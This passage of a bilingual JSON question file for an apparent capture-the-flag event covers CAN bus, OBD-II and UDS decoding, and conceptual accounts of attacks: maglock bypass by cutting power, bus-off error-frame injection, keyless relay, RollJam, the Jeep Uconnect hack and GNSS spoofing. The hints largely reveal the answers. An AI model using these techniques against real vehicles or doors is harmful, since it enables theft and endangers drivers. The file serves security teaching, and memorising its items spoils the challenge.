      "en": "Proxmark `lf search` found an EM4100 tag and printed its 40-bit ID `1A2B3C4D5E`. Give the lower 32 bits of that ID (the last 8 hex digits) as a decimal number."
    },
    "hints": {
      "ko": [
        "앞 두 자리 `1A` 를 버리고 `2B3C4D5E` 를 16진수로 읽는다.",
        "0x2B3C4D5E."
      ],
      "en": [
        "Drop the leading `1A` and read `2B3C4D5E` as hex.",
        "0x2B3C4D5E."
      ]
    }
  },
  {
    "id": "t4_maglock",
    "tier": 4,
    "cat": "lockpick",
    "track": "physical",
    "points": 250,
    "ci": true,
    "hash": "f26b4fff08de59ff712136253c5f4ebc4b974a726b36838709d1385fbe9265df",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "정전이면 열린다",
      "en": "Power Out, Door Open"
    },
    "prompt": {
      "ko": "전자석과 금속판의 자력으로 문을 붙잡는 잠금장치다. 화재 대피를 위해 대개 페일세이프로 배선되어, 전원선을 자르거나 브레이커를 내리거나 정전이 나면 잠금이 풀린다. UPS 가 없으면 정전 한 번에 모든 문이 열린다. 이 장치를 흔히 부르는 축약 이름은? (한 단어)",
      "en": "A lock that holds a door shut with the magnetic force between an electromagnet and an armature plate. It is usually wired fail-safe for fire evacuation, so cutting the power line, tripping the breaker, or a blackout releases it. With no UPS, one outage opens every door. Give the common shortened name for this device. (one word)"
    },
    "hints": {
      "ko": [
        "magnetic + lock 을 줄인 말.",
        "보안 우선이면 페일시큐어로 배선하고 UPS 와 금속 도관 보호를 더한다."
      ],
      "en": [
        "A contraction of magnetic + lock.",
        "For a security-first door, wire it fail-secure and add a UPS and metal conduit protection."
      ]
    }
  }
  ,
  {
    "id": "t0_bosch",
    "tier": 0,
    "cat": "can",
    "track": "automotive",
    "points": 50,
    "ci": true,
    "hash": "0600c79833cc723f51a26a1c39b46fcc6bb909a6db9b8c9a3885469f8aaa3fc2",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "버스를 만든 회사",
      "en": "Who Built the Bus"
    },
    "prompt": {
      "ko": "차량 내부의 수십 개 제어 장치를 잇는 2선식 차동 신호 버스는 1986년 독일의 한 자동차 부품 회사가 발표했고, 이후 거의 모든 승용차의 표준이 되었다. 이 회사의 이름은? (한 단어)",
      "en": "The two-wire differential bus that links the dozens of controllers inside a vehicle was published in 1986 by a German automotive-parts company, and went on to become standard in almost every passenger car. Name the company. (one word)"
    },
    "hints": {
      "ko": [
        "가솔린 직분사, 안티록 브레이크, 전동 공구로도 유명하다.",
        "본사는 슈투트가르트 인근 게를링겐."
      ],
      "en": [
        "The same firm is known for fuel injection, anti-lock brakes and power tools.",
        "Headquartered near Stuttgart, in Gerlingen."
      ]
    }
  }
  ,
  {
    "id": "t0_candump",
    "tier": 0,
    "cat": "can",
    "track": "automotive",
    "points": 50,
    "ci": true,
    "hash": "2770f5a4a692984e6ba96cf7b1cfc011671b3cff6b6234a96695303755bce253",
    "fmt": "명령어 / command",
    "title": {
      "ko": "버스를 엿듣기",
      "en": "Listen to the Bus"
    },
    "prompt": {
      "ko": "리눅스 can-utils 모음에는 지정한 CAN 인터페이스에 흐르는 모든 프레임을 타임스탬프와 함께 터미널에 그대로 찍어 주는 명령이 있다. 트래픽을 처음 살필 때 가장 먼저 실행하는 도구다. 그 명령의 이름은?",
      "en": "The Linux can-utils package has a command that prints every frame on a given CAN interface straight to the terminal, with timestamps. It is the first tool you reach for when surveying traffic. Name the command."
    },
    "hints": {
      "ko": [
        "이름은 버스 이름 뒤에 'dump' 를 붙인 것이다.",
        "`-l` 옵션은 로그 파일에 저장하고, canplayer 로 재생한다."
      ],
      "en": [
        "The name is the bus name followed by 'dump'.",
        "The `-l` option writes a log file that canplayer can replay."
      ]
    }
  }
  ,
  {
    "id": "t1_socketcan",
    "tier": 1,
    "cat": "can",
    "track": "automotive",
    "points": 100,
    "ci": true,
    "hash": "fee453f4c60741d04fde81aac8ca19ee78bf72978b4b1b3a9f7750a0cf2a8211",
    "fmt": "값 그대로 / literal (9글자 / 9 chars)",
    "title": {
      "ko": "네트워크로 취급되는 버스",
      "en": "The Bus as a Network"
    },
    "prompt": {
      "ko": "리눅스 커널은 CAN 버스를 일반 네트워크 인터페이스처럼 다루게 해 주는 서브시스템을 내장한다. `AF_CAN` 소켓 패밀리로 표준 소켓 API 를 쓰고, `ip link` 로 인터페이스를 올리며, can-utils 프로그램들이 그 위에서 동작한다. 이 서브시스템의 이름은?",
      "en": "The Linux kernel ships a subsystem that lets you treat a CAN bus like an ordinary network interface: the `AF_CAN` socket family gives you the standard socket API, `ip link` brings the interface up, and the can-utils programs run on top of it. Name it."
    },
    "hints": {
      "ko": [
        "'socket' 과 'CAN' 을 그대로 붙인 이름이다.",
        "가상 인터페이스는 `modprobe vcan` 으로 만든다."
      ],
      "en": [
        "The name is just 'socket' and 'CAN' run together.",
        "You make a virtual interface with `modprobe vcan`."
      ]
    }
  }
  ,
  {
    "id": "t1_arbitration",
    "tier": 1,
    "cat": "can",
    "track": "automotive",
    "points": 100,
    "ci": true,
    "hash": "e49f5710c8d3e66821f0e0ee1c3ed574df3f0b48e2a65c4c357b654fa10ef402",
    "fmt": "한 단어 / one word (11글자 / 11 chars)",
    "title": {
      "ko": "낮은 번호가 이긴다",
      "en": "Lowest Number Wins"
    },
    "prompt": {
      "ko": "여러 노드가 동시에 전송을 시작하면 CAN 은 충돌을 파괴 없이 해결한다. 각 노드는 자신이 보낸 비트와 버스에서 읽히는 비트를 비교하다가 달라지는 순간 조용히 물러나고, 식별자가 수치상 가장 낮은 프레임이 버스를 계속 차지한다. 손실되는 메시지는 없다. 이 과정을 가리키는 한 단어는? (11글자)",
      "en": "When several nodes begin transmitting at once, CAN resolves the clash without destroying anything: each node compares the bit it sent with the bit it reads back, drops out the instant they differ, and the frame with the numerically lowest identifier keeps the bus. No message is lost. Give the one word for this process. (11 characters)"
    },
    "hints": {
      "ko": [
        "법정 밖에서 분쟁을 가리는 절차와 같은 낱말이다.",
        "그래서 CAN 식별자는 우선순위 역할을 겸한다 — 0x000 이 최고 우선순위."
      ],
      "en": [
        "The word is the same one used for settling a dispute out of court.",
        "This is why a CAN identifier doubles as a priority — 0x000 is highest."
      ]
    }
  }
  ,
  {
    "id": "t1_recessive",
    "tier": 1,
    "cat": "can",
    "track": "automotive",
    "points": 100,
    "ci": true,
    "hash": "d5512f5151f813dba9717443758686e9d12a188b87033f587f2e1dea34540ba4",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "물러서는 비트",
      "en": "The Yielding Bit"
    },
    "prompt": {
      "ko": "CAN 버스의 두 비트 상태 중 하나는 '우세(dominant)'라 불리며 논리 0 에 해당하고 버스를 능동적으로 끌어내린다. 다른 하나는 논리 1 로, 아무도 버스를 구동하지 않을 때의 기본 상태이며 우세 비트가 나타나면 덮인다. 이 물러서는 쪽 비트 상태의 이름은? (한 단어)",
      "en": "Of the two bit states on a CAN bus, one is called 'dominant' — it is logical 0 and actively pulls the bus down. The other is logical 1, the resting state when no node drives the bus, and it is overwritten whenever a dominant bit appears. Name this yielding state. (one word)"
    },
    "hints": {
      "ko": [
        "유전학에서 '우성' 에 대비되는 그 낱말이다.",
        "같은 값이 다섯 번 연속되면 반대 비트를 끼워 넣는 비트 스터핑이 동기화를 유지한다."
      ],
      "en": [
        "It is the genetics word paired against 'dominant'.",
        "Bit stuffing — inserting an opposite bit after five equal ones — keeps clocks in sync."
      ]
    }
  }
  ,
  {
    "id": "t1_elm327",
    "tier": 1,
    "cat": "can",
    "track": "automotive",
    "points": 100,
    "ci": true,
    "hash": "a1925d1b20f214a63daefa42a35e2dadfbb4b47cabc8c6adb646a0e331d87877",
    "fmt": "값 그대로 / literal (6글자 / 6 chars)",
    "title": {
      "ko": "싸구려 동글의 두뇌",
      "en": "The Cheap Dongle's Brain"
    },
    "prompt": {
      "ko": "저렴한 블루투스·USB 진단 동글은 대부분 캐나다 ELM Electronics 가 만든 특정 인터프리터 IC 의 명령어 집합(AT 명령)을 그대로 흉내 낸다. 스마트폰 진단 앱은 이 명령어 규약에 맞춰 대화한다. 그 IC 의 모델명은? (6글자)",
      "en": "A cheap Bluetooth or USB diagnostic dongle almost always emulates the command set (AT commands) of one interpreter IC made by ELM Electronics of Canada. Phone diagnostic apps talk to that command dialect. Give the IC's model name. (6 characters)"
    },
    "hints": {
      "ko": [
        "글자 셋에 숫자 셋. 앞 세 글자는 제조사 이름과 같다.",
        "정품은 PIC 마이크로컨트롤러 기반이고, 시중엔 복제 클론이 흔하다."
      ],
      "en": [
        "Three letters then three digits; the letters match the maker's name.",
        "The genuine part is built on a PIC microcontroller; cheap clones are everywhere."
      ]
    }
  }
  ,
  {
    "id": "t1_extid",
    "tier": 1,
    "cat": "can",
    "track": "automotive",
    "points": 100,
    "ci": true,
    "hash": "35135aaa6cc23891b40cb3f378c53a17a1127210ce60e125ccf03efcfdaec458",
    "fmt": "숫자 / number",
    "title": {
      "ko": "긴 쪽 식별자",
      "en": "The Longer Identifier"
    },
    "prompt": {
      "ko": "고전 CAN 2.0A 프레임의 식별자는 11비트다. CAN 2.0B 와, 그 위에 얹는 상용차 프로토콜 J1939 는 더 긴 확장 식별자를 쓴다. 확장 식별자는 몇 비트인가? (숫자)",
      "en": "A classic CAN 2.0A frame carries an 11-bit identifier. CAN 2.0B, and the commercial-vehicle protocol J1939 layered on top of it, use a longer extended identifier instead. How many bits is the extended identifier? (a number)"
    },
    "hints": {
      "ko": [
        "11비트 기본부(base) 뒤에 18비트가 더 붙는다.",
        "11 + 18."
      ],
      "en": [
        "An 18-bit extension is appended to the 11-bit base part.",
        "11 + 18."
      ]
    }
  }
  ,
  {
    "id": "t1_immobilizer",
    "tier": 1,
    "cat": "telematics",
    "track": "automotive",
    "points": 100,
    "ci": true,
    "hash": "c03c0b6efb07a00580ea64951ce612915ea7ddee022a63f05d97a98d1b40c53b",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "열쇠가 있어야 시동",
      "en": "No Key, No Start"
    },
    "prompt": {
      "ko": "1990년대 후반부터 의무화된 도난 방지 장치로, 시동 계통과 연료 분사를 비활성 상태로 잡아 둔다. 키에 내장된 소형 트랜스폰더 칩이 정확한 코드로 응답할 때만 엔진 제어 장치가 시동을 허용한다. 이 장치를 부르는 한 단어는?",
      "en": "A theft-prevention device, mandatory since the late 1990s, that holds the starter circuit and fuel injection inactive. The engine controller only allows a start when a small transponder chip in the key answers with the correct code. What one word names this device?"
    },
    "hints": {
      "ko": [
        "'움직이지 못하게 하는 것' 이라는 뜻의 -er 명사다.",
        "이걸 우회하려는 시도가 신호 증폭 공격과 키 복제로 이어진다."
      ],
      "en": [
        "An -er noun meaning 'the thing that stops something from moving'.",
        "Trying to get past it is what the signal-amplification and key-cloning attacks are for."
      ]
    }
  }
  ,
  {
    "id": "t2_canlog",
    "tier": 2,
    "cat": "can",
    "track": "automotive",
    "points": 150,
    "ci": false,
    "hash": "266714fa37423b154a1721384f72bd2230f1154838cf692f9ffdfac62fa3b19b",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "진단 범위의 프레임",
      "en": "Frames in the Diagnostic Range"
    },
    "prompt": {
      "ko": "아래는 vcan0 에서 받은 표준 CAN 로그 캡처다(타임스탬프·인터페이스·ID#데이터). 대부분은 주기적 계기 트래픽이지만, 진단용 상위 식별자 `0x7FF` 로 나가는 프레임들의 페이로드를 시간 순서대로 이어 ASCII 로 읽으면 플래그가 된다.\n\n```\n(1690000000.010203) vcan0 100#1122334455667788\n(1690000000.011000) vcan0 7FF#464C41477B43414E\n(1690000000.012000) vcan0 2B0#0000000000000000\n(1690000000.013000) vcan0 7FF#5F4255535F534E49\n(1690000000.014000) vcan0 1A0#00FF00FF00FF00FF\n(1690000000.015000) vcan0 7FF#464645447D\n(1690000000.016000) vcan0 300#0118000000000000\n```\n\n`FLAG{...}` 형태로 제출하라.",
      "en": "Below is a standard CAN-log capture from vcan0 (timestamp, interface, ID#data). Most of it is periodic instrument traffic, but if you take the payloads of the frames sent on `0x7FF` — the top diagnostic identifier — in time order and read them as ASCII, you get the flag.\n\n```\n(1690000000.010203) vcan0 100#1122334455667788\n(1690000000.011000) vcan0 7FF#464C41477B43414E\n(1690000000.012000) vcan0 2B0#0000000000000000\n(1690000000.013000) vcan0 7FF#5F4255535F534E49\n(1690000000.014000) vcan0 1A0#00FF00FF00FF00FF\n(1690000000.015000) vcan0 7FF#464645447D\n(1690000000.016000) vcan0 300#0118000000000000\n```\n\nSubmit it as `FLAG{...}`."
    },
    "hints": {
      "ko": [
        "`7FF:7FF` 필터를 걸면 그 식별자만 남는다.",
        "`46 4C 41 47` 은 `F L A G`. 세 프레임을 붙이면 21바이트다."
      ],
      "en": [
        "A `7FF:7FF` filter isolates just that identifier.",
        "`46 4C 41 47` is `F L A G`. The three frames concatenate to 21 bytes."
      ]
    }
  }
  ,
  {
    "id": "t2_cansum",
    "tier": 2,
    "cat": "can",
    "track": "automotive",
    "points": 150,
    "ci": false,
    "hash": "85942abd8aa0d9daeda2a7575f5eff0af5ec857d530f93f08dd696f3c2ffeb13",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "페이로드를 닫는 바이트",
      "en": "The Byte That Closes the Payload"
    },
    "prompt": {
      "ko": "어떤 ECU 는 8바이트 CAN 프레임의 마지막 바이트를 앞 7바이트 전체의 XOR 로 채운다(단순 무결성 검사). 앞 7바이트가 `12 34 56 78 9A BC DE` 일 때 여덟 번째 바이트를 구하고, `FLAG{CKSUM_XX}` 형태로 제출하라. XX 는 대문자 16진수 두 자리다.",
      "en": "One ECU fills the last byte of an 8-byte CAN frame with the XOR of the first seven bytes (a crude integrity check). Given the first seven bytes `12 34 56 78 9A BC DE`, work out the eighth byte and submit it as `FLAG{CKSUM_XX}`, where XX is two uppercase hex digits."
    },
    "hints": {
      "ko": [
        "XOR 은 결합·교환 법칙이 성립한다 — 순서는 무관하다.",
        "`12 ^ 34 = 26`; 계속 누적해 나가라."
      ],
      "en": [
        "XOR is associative and commutative — order does not matter.",
        "`12 ^ 34 = 26`; keep folding."
      ]
    }
  }
  ,
  {
    "id": "t2_obdrpm",
    "tier": 2,
    "cat": "uds",
    "track": "automotive",
    "points": 150,
    "ci": true,
    "hash": "2f11192801e83bf30f01139f338c5cf52a5e5cdf3e5b7c2d3ef5b051e9fd1fde",
    "fmt": "숫자 / number",
    "title": {
      "ko": "회전수 두 바이트",
      "en": "Two Bytes of Revs"
    },
    "prompt": {
      "ko": "OBD-II 표준에서 엔진 회전수(PID 0x0C)의 응답은 두 데이터 바이트 A, B 로 오고, 실제 값은 rpm = (A × 256 + B) ÷ 4 이다. 어떤 응답이 A = 0x1A, B = 0xF8 을 담고 있었다. rpm 값은? (숫자)",
      "en": "In OBD-II, the reply for engine speed (PID 0x0C) carries two data bytes A and B, and the real value is rpm = (A × 256 + B) ÷ 4. One reply held A = 0x1A and B = 0xF8. What is the rpm? (a number)"
    },
    "hints": {
      "ko": [
        "0x1A = 26, 0xF8 = 248.",
        "26 × 256 + 248 = 6904; 그다음 4로 나눈다."
      ],
      "en": [
        "0x1A = 26, 0xF8 = 248.",
        "26 × 256 + 248 = 6904; then divide by four."
      ]
    }
  }
  ,
  {
    "id": "t2_isotp",
    "tier": 2,
    "cat": "can",
    "track": "automotive",
    "points": 150,
    "ci": true,
    "hash": "f5ca38f748a1d6eaf726b8a42fb575c3c71f1864a8143301782de13da2d9202b",
    "fmt": "숫자 / number",
    "title": {
      "ko": "여러 프레임에 걸친 응답",
      "en": "A Reply Across Frames"
    },
    "prompt": {
      "ko": "8바이트를 넘는 진단 응답은 ISO-TP(ISO 15765-2)로 나뉘어 전송된다. 첫 프레임(First Frame)은 첫 바이트의 하위 4비트와 둘째 바이트를 합쳐 전체 길이를 12비트로 알린다. 첫 두 바이트가 `10 14` 인 첫 프레임이 알리는 전체 메시지 길이는 몇 바이트인가? (숫자)",
      "en": "A diagnostic reply longer than 8 bytes is split with ISO-TP (ISO 15765-2). Its First Frame encodes the total length in 12 bits: the low nibble of the first byte joined with the second byte. For a First Frame whose first two bytes are `10 14`, how many bytes is the whole message? (a number)"
    },
    "hints": {
      "ko": [
        "첫 바이트 0x10 → 상위 니블 1 은 'First Frame' 표시, 하위 니블은 0.",
        "그래서 길이는 앞에 0x0 을 붙인 0x14 — 이 한 바이트를 10진수로."
      ],
      "en": [
        "First byte 0x10 → the high nibble 1 marks 'First Frame', the low nibble is 0.",
        "So the length is 0x14 with a leading 0x0 — convert that single byte to decimal."
      ]
    }
  }
  ,
  {
    "id": "t2_flexray",
    "tier": 2,
    "cat": "can",
    "track": "automotive",
    "points": 150,
    "ci": true,
    "hash": "86786512a7dd7ba7cfd49bd20df5bf6ee61b2a1a9ee9fe21bf7c50d4040da4e4",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "시간표대로 도는 버스",
      "en": "A Bus on a Timetable"
    },
    "prompt": {
      "ko": "CAN 보다 빠르고 결정적인 차량 버스다: 최대 10 Mbit/s, 두 채널 이중화, 시간 트리거 방식이라 각 메시지가 고정된 슬롯에 실린다. 조향·제동 케이블을 전자식으로 대체하는 X-by-wire 안전 계통에 쓰이며, BMW 7 시리즈가 처음 양산 적용했다. 이 버스의 이름은? (한 단어)",
      "en": "A vehicle bus faster and more deterministic than CAN: up to 10 Mbit/s, two redundant channels, time-triggered so every message rides in a fixed slot. Used for X-by-wire safety systems that replace steering and braking cables, and first shipped in the BMW 7 Series. Name the bus. (one word)"
    },
    "hints": {
      "ko": [
        "'유연한' 과 '광선' 을 붙인 상표명이다.",
        "정적 세그먼트는 시간표대로, 동적 세그먼트는 미니슬롯으로 남는 대역을 나눈다."
      ],
      "en": [
        "A trademark joining 'flexible' and 'ray'.",
        "A static segment runs to the timetable; a dynamic segment shares the rest with minislots."
      ]
    }
  }
  ,
  {
    "id": "t2_lin",
    "tier": 2,
    "cat": "can",
    "track": "automotive",
    "points": 150,
    "ci": true,
    "hash": "2f48b881ea7073f1c6f083b296a360bd4c9cf51edaacba1cd9c34d8ae3d994ec",
    "fmt": "약어 / acronym (3글자 / 3 chars)",
    "title": {
      "ko": "미러와 창문용 곁버스",
      "en": "The Side Bus for Mirrors"
    },
    "prompt": {
      "ko": "CAN 을 깔기엔 아까운 저속·저비용 기능(도어 미러, 파워 윈도, 와이퍼, 실내등)을 위한 단선 직렬 서브버스다. 하나의 마스터가 슬레이브들을 폴링하고 슬레이브끼리는 직접 말하지 않는다. 12V 단선, 최대 19.2 kbit/s. 세 글자 약어는?",
      "en": "A single-wire, low-speed, low-cost serial sub-bus for functions not worth a CAN drop — door mirrors, power windows, wipers, cabin lights. One master polls the slaves; slaves never talk to each other. Single 12 V wire, up to 19.2 kbit/s. Give the three-letter abbreviation."
    },
    "hints": {
      "ko": [
        "머리글자는 Local Interconnect Network.",
        "CAN 곁가지로 붙어 브리지 컨트롤러를 거쳐 본선과 오간다."
      ],
      "en": [
        "The initials of Local Interconnect Network.",
        "It hangs off a CAN branch and reaches the main bus through a bridging controller."
      ]
    }
  }
  ,
  {
    "id": "t2_busoff",
    "tier": 2,
    "cat": "can",
    "track": "automotive",
    "points": 150,
    "ci": true,
    "hash": "831458df99c1bcf16c11a0fe8402f26a3ed92ae89e67c88474b37c0f5dfd90de",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "카운터가 넘치면",
      "en": "When the Counter Overflows"
    },
    "prompt": {
      "ko": "CAN 컨트롤러는 전송 오류 카운터(TEC)를 유지한다. 값이 127 을 넘으면 '에러 수동' 상태가 되고, 255 를 넘으면 노드가 아예 회선에서 스스로 떨어져 나간다. 공격자가 표적 ECU 를 겨냥해 오류 프레임을 반복 주입하면 그 노드를 이 상태로 밀어 넣어 무력화할 수 있다. 이 마지막 상태의 이름은? (두 단어)",
      "en": "A CAN controller keeps a transmit error counter (TEC). Past 127 it goes 'error passive'; past 255 the node drops itself off the wire entirely. An attacker who keeps injecting error frames aimed at one ECU can push that node into this state and take it out. Name this final state. (two words)"
    },
    "hints": {
      "ko": [
        "두 낱말 모두 짧다. 첫 낱말은 이 회선 자체를 가리킨다.",
        "복구하려면 보통 회선에서 일정한 유휴 시퀀스를 128번 관측해야 한다."
      ],
      "en": [
        "Both words are short; the first word is the wire itself.",
        "Recovery usually needs 128 observed idle sequences on the wire."
      ]
    }
  }
  ,
  {
    "id": "t2_dbc",
    "tier": 2,
    "cat": "can",
    "track": "automotive",
    "points": 150,
    "ci": true,
    "hash": "e93f0a474e01c65ef2b56ca0a310de856f5d95a1be13f63bf4bd1c25c1ce3596",
    "fmt": "확장자 / extension",
    "title": {
      "ko": "원시 바이트에 이름 붙이기",
      "en": "Naming the Raw Bytes"
    },
    "prompt": {
      "ko": "CAN 프레임의 페이로드는 그냥 바이트 뭉치다. Vector 사가 정한 텍스트 데이터베이스 파일 포맷은 식별자마다 어떤 비트 범위가 어떤 신호(엔진 온도, 조향각 …)이고 스케일·오프셋·단위가 무엇인지 적어 둔다. cantools 같은 도구가 이 파일을 불러 원시 프레임을 물리값으로 디코딩한다. 이 파일 포맷의 세 글자 확장자는?",
      "en": "A CAN payload is just a blob of bytes. A text database file format defined by Vector records, per identifier, which bit range is which signal (engine temperature, steering angle …) and its scale, offset and unit. Tools like cantools load this file to decode raw frames into physical values. Give the format's three-letter extension."
    },
    "hints": {
      "ko": [
        "CAN 뒤에 database.",
        "리버싱으로 이 파일을 채워 나가는 것이 알 수 없는 신호를 해독하는 작업이다."
      ],
      "en": [
        "CAN followed by database.",
        "Building this file up by reverse engineering is how you decode unknown signals."
      ]
    }
  }
  ,
  {
    "id": "t3_seedkey",
    "tier": 3,
    "cat": "uds",
    "track": "automotive",
    "points": 200,
    "ci": false,
    "hash": "e096b32db5ffad52f6eb146c4d89fd3f1f60748b2799e70123e82edf8705b640",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "메이커 알고리즘",
      "en": "The Maker's Algorithm"
    },
    "prompt": {
      "ko": "ISO 14229 진단 프로토콜의 SecurityAccess(서비스 0x27)는 챌린지-응답이다. `27 01` 을 보내면 ECU 가 4바이트 챌린지 값을 돌려주고, 클라이언트는 메이커 고유 알고리즘으로 응답 키를 계산해 `27 02` 로 보낸다. 펌웨어를 덤프해 보니 알고리즘은 단순히 `key = challenge XOR 0xDEADBEEF` 였다. ECU 가 돌려준 챌린지가 `0x1A2B3C4D` 일 때, 계산한 키를 `FLAG{KEY_XXXXXXXX}` (대문자 16진수 8자리)로 제출하라.",
      "en": "In the ISO 14229 diagnostic protocol, SecurityAccess (service 0x27) is a challenge-response. You send `27 01`, the ECU returns a 4-byte challenge value, and the client computes the response key with the maker's own algorithm and sends it as `27 02`. Dumping the firmware shows the algorithm is just `key = challenge XOR 0xDEADBEEF`. The ECU returned the challenge `0x1A2B3C4D`. Submit the computed key as `FLAG{KEY_XXXXXXXX}` (eight uppercase hex digits)."
    },
    "hints": {
      "ko": [
        "1A ^ DE, 2B ^ AD, 3C ^ BE, 4D ^ EF 를 바이트별로.",
        "결과의 첫 바이트는 0xC4 다."
      ],
      "en": [
        "Take 1A ^ DE, 2B ^ AD, 3C ^ BE, 4D ^ EF byte by byte.",
        "The first byte of the result is 0xC4."
      ]
    }
  }
  ,
  {
    "id": "t3_freshness",
    "tier": 3,
    "cat": "uds",
    "track": "automotive",
    "points": 200,
    "ci": true,
    "hash": "d37985420b738554ca1d44a989de02c07bb53296b6246c1f72bb0c75aa8e0534",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "재생을 막는 숫자",
      "en": "The Number That Stops Replay"
    },
    "prompt": {
      "ko": "차량용 보안 온보드 통신 방식은 선택한 CAN 프레임에 짧은 인증 코드(잘린 MAC)를 붙인다. 그것만으로는 공격자가 프레임을 통째로 녹음했다가 나중에 다시 흘리면 통과한다. 그래서 매번 증가하는 값을 함께 MAC 계산에 넣어, 지난 프레임을 재생하면 검증이 깨지게 한다. 이 단조 증가 값을 부르는 한 단어는?",
      "en": "An automotive secure onboard communication scheme attaches a short authenticator (a truncated MAC) to selected CAN frames. That alone is not enough — an attacker can record a whole frame and replay it later and it still verifies. So a value that rises every time is folded into the MAC as well, breaking verification for any replayed frame. What one word names this monotonically increasing value?"
    },
    "hints": {
      "ko": [
        "'신선함' 이라는 뜻의 -ness 명사다.",
        "보통 트립 카운터와 타임스탬프를 합쳐 만든다."
      ],
      "en": [
        "A '-ness' noun meaning 'newness'.",
        "It is usually built from a trip counter and a timestamp."
      ]
    }
  }
  ,
  {
    "id": "t3_pkes",
    "tier": 3,
    "cat": "telematics",
    "track": "automotive",
    "points": 200,
    "ci": true,
    "hash": "15bf42007b25958227aff0d05b5097335a56c094bee38a2bbf1ef24faa1fcc2e",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "다가가면 열린다",
      "en": "It Opens as You Approach"
    },
    "prompt": {
      "ko": "키를 주머니에 넣은 채 손잡이를 잡으면 문이 열리고 버튼으로 시동이 걸리는 편의 기능이다. 차와 키가 초저주파(LF) 신호로 서로의 근접을 확인한다. 공격자 둘이 각각 안테나를 들고, 집 안의 키에서 나온 신호를 차까지 실시간으로 증폭·전달하면 차는 키가 마당에 있는 것처럼 속아 문을 열고 시동까지 건다. 이 편의 기능의 네 글자 약어는?",
      "en": "A convenience feature where the door opens when you grab the handle with the key still in your pocket, and a button starts the engine. Car and key confirm each other's proximity over a low-frequency (LF) signal. Two attackers, each holding an antenna, amplify and pass that signal in real time from the key indoors out to the car, so the car is fooled into thinking the key is in the driveway — and it opens and starts. Give the four-letter abbreviation for this feature."
    },
    "hints": {
      "ko": [
        "Passive Keyless Entry and Start.",
        "대응책: 키에 모션 센서를 넣어 정지 시 잠들게 하거나, UWB 거리 측정을 쓴다."
      ],
      "en": [
        "Passive Keyless Entry and Start.",
        "Countermeasures: a motion sensor that sleeps the key when still, or UWB ranging."
      ]
    }
  }
  ,
  {
    "id": "t3_rolljam",
    "tier": 3,
    "cat": "telematics",
    "track": "automotive",
    "points": 200,
    "ci": true,
    "hash": "35fdfb4f116f4184c867d3de2961f728646047c451b11bb4db8e986b7c5b3d01",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "미룬 코드를 나중에",
      "en": "The Withheld Code, Later"
    },
    "prompt": {
      "ko": "구형 무선 키는 버튼을 누를 때마다 다음 롤링 코드를 보낸다 — 재생 공격을 막기 위해서다. 한 연구자가 공개한 장치는 이 전송을 방해(재밍)하면서 동시에 녹음한다. 사용자가 한 번 더 누르면 첫 코드는 계속 붙잡아 둔 채 두 번째만 차에 흘려보내, 아직 쓰지 않은 첫 코드를 손에 넣는다. 나중에 그 코드로 문을 연다. 이 장치이자 기법의 이름은? (한 단어)",
      "en": "An older wireless key sends the next rolling code each time you press the button — to defeat replay. A device published by a researcher jams that transmission while recording it. When the user presses again, it keeps holding the first code and forwards only the second to the car, so it now holds an unused code. Later it uses that code to open the door. Name the device and technique. (one word)"
    },
    "hints": {
      "ko": [
        "'구르다' 와 '방해하다' 를 붙인 이름.",
        "Samy Kamkar 가 2015년 DEF CON 에서 시연했다."
      ],
      "en": [
        "'Roll' plus 'jam'.",
        "Samy Kamkar demonstrated it at DEF CON 2015."
      ]
    }
  }
  ,
  {
    "id": "t3_uconnect",
    "tier": 3,
    "cat": "telematics",
    "track": "automotive",
    "points": 200,
    "ci": true,
    "hash": "b8fbb972a4544db24be462594e826be5798d4e22287819c299f34b8c3a710634",
    "fmt": "값 그대로 / literal (8글자 / 8 chars)",
    "title": {
      "ko": "셀룰러에서 버스로",
      "en": "From Cellular to the Bus"
    },
    "prompt": {
      "ko": "2015년, 연구자들은 피아트크라이슬러 차량의 인포테인먼트 시스템이 셀룰러망 쪽으로 열어 둔 포트(6667/tcp)를 통해 원격 침투했고, 거기서 별도 마이크로컨트롤러를 거쳐 CAN 버스로 넘어가 고속도로를 달리던 Jeep Cherokee 의 제동과 조향에 개입했다. 140만 대 리콜로 이어졌다. 이 인포테인먼트 시스템의 제품명은? (8글자)",
      "en": "In 2015, researchers remotely broke into the infotainment system of Fiat Chrysler vehicles through a port it left open toward the cellular network (6667/tcp), pivoted from there through a separate microcontroller onto the CAN bus, and interfered with the braking and steering of a Jeep Cherokee driving on a highway. It led to a recall of 1.4 million vehicles. Give the product name of that infotainment system. (8 characters)"
    },
    "hints": {
      "ko": [
        "'you connect' 처럼 읽는 이름이고, U 로 시작한다.",
        "Charlie Miller 와 Chris Valasek 의 연구다."
      ],
      "en": [
        "The name reads like 'you connect' and starts with U.",
        "The work of Charlie Miller and Chris Valasek."
      ]
    }
  }
  ,
  {
    "id": "t3_gnss",
    "tier": 3,
    "cat": "telematics",
    "track": "automotive",
    "points": 200,
    "ci": true,
    "hash": "c97147d5c731672d8a583714b1886d79e983b4d438e83b0fa737860afb6a48f1",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "가짜 하늘 신호",
      "en": "A Fake Signal From the Sky"
    },
    "prompt": {
      "ko": "차량의 위치 인식은 여러 위성 항법 시스템(미국 GPS, 러시아 GLONASS, 유럽 Galileo, 중국 BeiDou)의 신호에 의존한다. 이들을 통칭하는 네 글자 약어가 있다. 공격자가 진짜보다 강한 가짜 신호를 방출하면 수신기를 장악해 차량이 인식하는 위치를 서서히 딴 곳으로 끌고 갈 수 있다(스푸핑). 이 통칭 약어는?",
      "en": "A vehicle's sense of location relies on signals from several satellite navigation systems (the US GPS, Russia's GLONASS, Europe's Galileo, China's BeiDou). There is a four-letter abbreviation covering all of them. An attacker who emits a counterfeit signal stronger than the real one can capture the receiver and slowly walk the vehicle's perceived position elsewhere (spoofing). Give that umbrella abbreviation."
    },
    "hints": {
      "ko": [
        "Global Navigation Satellite System.",
        "방어: 다중 주파수 수신, 관성 센서 융합, 신호 도래각 검사."
